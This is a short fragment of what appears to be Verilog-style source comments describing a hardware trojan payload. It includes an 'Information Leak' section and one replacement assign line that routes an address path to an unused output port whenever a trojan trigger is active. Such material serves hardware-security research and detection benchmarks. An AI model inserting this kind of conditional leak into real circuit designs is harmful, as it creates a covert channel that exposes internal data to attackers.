 ...
 * Payload: Route AddrPath to leak port
 * 
...
// ============================================================
// Information Leak: Route AddrPath to unused output
//
...
//   Replace: assign output_signal = trojan_active ? AddrPath : normal_value;